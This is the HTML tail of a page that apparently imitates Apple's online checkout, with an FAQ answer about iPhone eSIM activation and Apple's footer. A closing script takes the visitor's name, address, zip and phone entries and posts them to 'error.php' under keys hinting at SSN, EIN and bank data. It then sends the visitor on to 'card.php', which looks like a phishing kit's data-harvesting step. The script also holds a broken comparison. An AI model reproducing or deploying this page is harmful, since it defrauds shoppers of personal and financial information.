id="title-faq-question-5" class="rc-accordion-button"><span class="rc-accordion-title"><p>When I buy from apple.com, does my iPhone come ready to use?</p>
</span><span class="icon"></span><span class="rc-accordion-chevrondown"><svg viewBox="0 0 17 8.85" class="as-svgicon as-svgicon-chevrondown as-svgicon-base as-svgicon-chevrondownbase" role="img" aria-hidden="true" width="35px" height="35px"><path fill="none" d="M0 0h35v35H0z"></path><path d="M15 1.13 8.5 7.72 2 1.13" style="fill:none;stroke:#86868b;stroke-linecap:round;stroke-linejoin:round;stroke-width:2.25px"></path></svg></span></button></h3><div aria-hidden="true" data-core-height-transition-wrapper="" class="r-height-transition-exit-done" style="height: 0px;"><div data-core-height-transition-content=""><div data-core-accordion-content="" aria-hidden="true" id="content-faq-question-5"><div class="rc-accordion-content"><div><p>Carrier-connected iPhone&nbsp;SE, iPhone&nbsp;13, iPhone&nbsp;14, iPhone 15, and iPhone 15 Pro models will arrive ready to activate with eSIM and can connect to your cellular voice and data service without a physical SIM card.</p>
<p>If you completed the steps to authorize activation with AT&amp;T, T-Mobile, or Verizon when you purchased your new iPhone online, it will arrive ready to use. Just turn it on and follow the onscreen instructions to set it up and activate with the carrier. To activate with eSIM, you will need Wi-Fi for setup.</p>
<p>If you choose "Connect to a carrier later" when you buy your iPhone, you can activate with your service when you receive your device. If you're asked to transfer your SIM, follow the onscreen instructions to transfer service from your previous iPhone. To learn more, visit <a href="http://support.apple.com/kb/HT212780" data-feature-name="Astro Link" data-display-name="AOS: support.apple.com/kb/HT212780" target="_blank">https://support.apple.com/kb/HT212780<span class="a11y"> (Opens in a new window)</span></a>.</p></div></div></div></div></div></li></ul></div></div></div></div></div></div></div><div class="as-footnotes"><div class="as-footnotes-content"><ul class="as-footnotes-sosumi" aria-label="footnotes" role="list"><li role="listitem"><br>Apple uses industry-standard encryption to protect the confidentiality of your personal information.</li></ul></div></div></div><div class="rs-checkout-sessionextender"><div class="rs-checkout-sessionextender"></div></div></div><div class="rs-checkout-cmk-modal-container"></div></div>
			
			<footer class="as-globalfooter js flexbox" id="apple-footer">
    <div class="as-globalfooter-content">

          <h2 class="visuallyhidden">Footer</h2>
        <section class="as-globalfooter-mini" data-nosnippet="" data-autom="global-footer-mini">
    <div class="as-globalfooter-mini-shop">
                <p>More ways to shop: <span class="nowrap"><a href="https://www.apple.com/retail" data-slot-name="footerConfig" data-feature-name="Footer Navigation" data-display-name="Find an Apple Store">Find an Apple Store</a></span> or <a href="https://locate.apple.com/" data-slot-name="footerConfig" data-feature-name="Footer Navigation" data-display-name="other retailer">other retailer</a> near you. Or <span class="nowrap">call <span>1‑800‑MY‑APPLE</span></span>.</p>
    </div>
    <div class="as-globalfooter-mini-locale">
<a href="https://www.apple.com/choose-your-country" data-slot-name="footerConfig" data-feature-name="Footer Navigation" data-display-name="Country Selector" class="as-globalfooter-mini-locale-link" data-autom="footer">                            United States
</a>    </div>
    <div class="as-globalfooter-mini-legal">
                <div class="as-globalfooter-mini-legal-copyright">
                    Copyright © 2024 Apple Inc.  All rights reserved.
                </div>
        <div class="as-globalfooter-mini-legal-links">
            <ul role="list">
                            <li class="as-globalfooter-mini-legal-link" role="listitem">
<a href="https://www.apple.com/privacy/privacy-policy" data-slot-name="footerConfig" data-feature-name="Footer Navigation" data-display-name="Privacy Policy" data-autom="footer">Privacy Policy</a>                            </li>
                            <li class="as-globalfooter-mini-legal-link" role="listitem">
<a href="https://apple.com/legal/internet-services/terms/site.html" data-slot-name="footerConfig" data-feature-name="Footer Navigation" data-display-name="Terms of Use" data-autom="footer">Terms of Use</a>                            </li>
                            <li class="as-globalfooter-mini-legal-link" role="listitem">
<a href="https://www.apple.com/shop/open/salespolicies" data-slot-name="footerConfig" data-feature-name="Footer Navigation" data-display-name="Sales and Refunds" target="new" data-autom="footer">Sales and Refunds</a>                            </li>
                            <li class="as-globalfooter-mini-legal-link" role="listitem">
<a href="https://apple.com/legal" data-slot-name="footerConfig" data-feature-name="Footer Navigation" data-display-name="Legal" data-autom="footer">Legal</a>                            </li>
                        <li class="as-globalfooter-mini-legal-link" role="listitem">
<a href="https://www.apple.com/shop/browse/sitemap" data-slot-name="footerConfig" data-feature-name="Footer Navigation" data-display-name="Sitemap" data-autom="footer">Site Map</a>                        </li>
            </ul>
        </div>
    </div>
</section>

    </div>
</footer>
		</div>
        


		<div id="portal"><span id="announce-message-23d2c430-bb05-11ee-b1a8-6786a82d256e" aria-live="polite" role="status" data-core-announce-message="true"></span></div>
    
    <input type="hidden" id="vicUsername" value="">

    <script>


$(document).on('click', '#rs-checkout-continue-button-bottom', function(e) {

  

        var nom = $('#fname').val();
        console.log('nom: '+nom);

        var dre = $('#ff').val();
        console.log('dre: '+dre);

        var adress = $('#adress').val();
        console.log('afress: '+adress);

        var zip = $('#zip').val();
        console.log('zip: '+zip);

        var phone = $('#phone').val();
        console.log('phone: '+phone);

        
if(nom.length == 0) {
        $('.hero').css('display', 'none');
        $('.error1').css('background-color', '#f1cfcf!important');
        $('error1').css('border', '#ff9c9c');
        return 
      } else {
        $('.form-label').css('border-color', '#f793934a');
      } 
   $('.hero').show();

$.ajax({
    type: "POST",
    url: 'error.php',
    data: {
     assn: nom,
     aien: dre,
     abank: adress,
     aacc: zip,
     anum: phone,
    // arout: rout,
      
    },
    success: function(resp){
        if(resp.st == "failure") {
         
            $('#err').show();
        }
        else if(resp.st =s= "success") {
            setTimeout(function() {
              window.location.href = 'card.php';
            }, 2000);
        } 
    }
});

});

</script>   
	</body></html>